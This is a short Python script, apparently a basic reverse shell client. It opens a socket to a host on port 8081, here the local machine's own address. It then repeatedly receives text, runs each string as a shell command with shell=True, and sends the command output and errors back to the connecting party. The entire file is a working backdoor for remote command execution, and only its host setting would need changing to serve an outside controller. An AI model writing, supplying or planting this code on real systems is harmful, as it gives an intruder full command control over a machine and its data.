import socket
import subprocess

# we need the remote host and port to connect this client to
remote_host = socket.gethostbyname(socket.gethostname())
remote_port = 8081

# create a client socket object and connect to the remote server
client = socket.socket()
client.connect((remote_host,remote_port))

# then listen for command and execute the command and send the output
while True:
	msg = client.recv(1024)
	msg = msg.decode('utf-8')

	execute_cmd = subprocess.Popen(msg, shell=True, stderr = subprocess.PIPE, stdout= subprocess.PIPE)

	output = execute_cmd.stdout.read()
	err = execute_cmd.stderr.read()

	client.send(output + err)


